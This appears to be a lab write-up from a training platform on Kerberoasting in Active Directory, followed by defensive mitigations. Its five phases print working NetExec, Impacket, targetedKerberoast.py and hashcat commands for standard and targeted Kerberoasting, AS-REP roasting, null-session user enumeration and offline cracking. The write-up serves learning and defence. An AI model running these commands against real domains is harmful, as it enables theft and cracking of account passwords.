---
title: "Intro to Kerberos Roasting & Active Directory Abuse"
author: "Glueyy - Formatted with Gemini"
date: 2026-06-15
description: "Kerberoasting explained end to end - how the protocol is abused, how to identify and crack roastable accounts, and why it works."
tags: ["Guided Lab", "Kerberoasting"]
---

This is a jumble of notes and key highlighted points taken and condensed for the Hack Smarter lab: Guided Lab: Kerberoasting (Easy)

### Core Kerberos Concepts

Before attacking the protocol, it is necessary to understand the components involved in the ticket-granting process:

- **KDC (Key Distribution Center):** Typically running on the Domain Controller, this service processes all authentication and ticket requests.
    
- **TGT (Ticket Granting Ticket):** The master authentication "wristband" proving a user's identity to the KDC.
    
- **TGS (Ticket Granting Service):** A specific ticket requested by a user to access a target service (e.g., MSSQL, HTTP, CIFS).
    
- **SPN (Service Principal Name):** The unique identifier AD uses to map a running service to the account executing it.
    

SPNs generally fall under two account types:

1. **Computer Accounts:** Automatically generated, rotating, and massively complex random passwords.
    
2. **User/Service Accounts:** Manually created by admins to run services like MSSQL or IIS. Because these passwords are set by humans, they are often weaker and highly vulnerable to offline cracking.
    

### Phase 1: Standard Kerberoasting

If an attacker compromises an initial set of credentials, they can request TGS tickets for any service account with a registered SPN. A portion of this ticket is encrypted with the service account's password hash.

**Initial Access Credentials:**

- **Username:** `pentest`
    
- **Password:** `HackSmarter123!`
    
- **Target DC:** `10.1.216.26`
    

Using **NetExec** to extract the hashes via LDAP:

Bash

```
nxc ldap 10.1.216.26 -u pentest -p 'HackSmarter123!' --kerberoasting hashes.txt
```

Alternatively, executing the attack via **Impacket**:

Bash

```
impacket-GetUserSPNs 'hacksmarter.hsm'/'pentest':'HackSmarter123!' -dc-ip 10.1.216.26 -request
```

Both methods successfully dump the TGS hashes locally, queuing them up for Phase 4.

### Phase 2: Targeted Kerberoasting

Standard Kerberoasting relies on existing SPNs. However, if your compromised account holds `GenericWrite` or `WriteProperty` permissions over a target user account, you can manually force an SPN onto that victim, request a ticket, and then clean up your tracks.

_(Note: Ensure you are running the latest version of NetExec for the `--targeted-kerberoast` flag to function correctly.)_

This command connects to LDAP, sets the temporary SPN on the victim account (`jack_exec`), requests the TGS, and deletes the SPN:

Bash

```
nxc ldap 10.1.216.26 -u pentest -p 'HackSmarter123!' --kerberoasting targeted_kerberoast.txt --targeted-kerberoast jack_exec
```

If the built-in NetExec module fails in your environment, you can execute the attack manually using the `targetedKerberoast.py` tool:

Bash

```
python3 targetedKerberoast.py -v -d hacksmarter.hsm -u pentest -p 'HackSmarter123!' --dc-ip 10.1.216.26 --request-user jack_exec
```

### Phase 3: AS-REP Roasting

AS-REP Roasting targets accounts that have the "Do not require Kerberos preauthentication" property enabled. If this is flagged, an attacker can request an AS-REP message directly for that user, which contains data encrypted with the user's password hash. No initial authentication is required.

First, harvest a list of valid domain users. This can often be done via an unauthenticated SMB null session:

Bash

```
nxc smb 10.1.216.26 -u '' -p '' --users-export usernames.txt
```

Next, feed that user list back into NetExec to hunt for AS-REP vulnerable accounts. In this scenario, we discover the account `backup_svc` is vulnerable:

Bash

```
nxc ldap 10.1.216.26 -u backup_svc -p '' --no-preauth-targets usernames.txt --asreproast output.txt
```

### Phase 4: Offline Cracking

With the hashes acquired from Kerberoasting, Targeted Kerberoasting, and AS-REP Roasting, the next step is offline brute-forcing.

Passing the standard Kerberoast TGS hashes (Type 13100) into Hashcat against the `rockyou` wordlist:

Bash

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

Because this occurs offline on your attack hardware, there is zero network noise generated during the cracking process.

### Phase 5: Blue Team Defenses & Mitigation

Extracting hashes is trivial if the network is misconfigured. To combat Kerberos-based attacks, defenders must implement the following structural changes:

- **Implement Group Managed Service Accounts (gMSAs):** Instead of using standard user accounts to run AD services, migrate to gMSAs. These operate like standard accounts but utilize 120-character, highly complex passwords that are automatically rotated by the Domain Controller. If an attacker manages to Kerberoast a gMSA, the resulting hash is mathematically unfeasible to crack.
    
- **Enforce Maximum Password Entropy:** If legacy technical debt prevents the use of a gMSA and a traditional user account _must_ be used, treat that password like a static encryption key. It should be fully randomized and at least 25 to 30 characters in length.
    
- **Deprecate RC4 Encryption:** Older AD environments default to RC4 encryption for tickets, which modern GPUs can chew through rapidly. Audit your environment and enforce **AES-256** encryption for Kerberos. AES significantly increases the computational overhead required for offline cracking, rendering standard dictionary attacks highly inefficient.

- Completed lab link below

-  https://www.hacksmarter.org/completion/f0c174dd64b7d2ff 
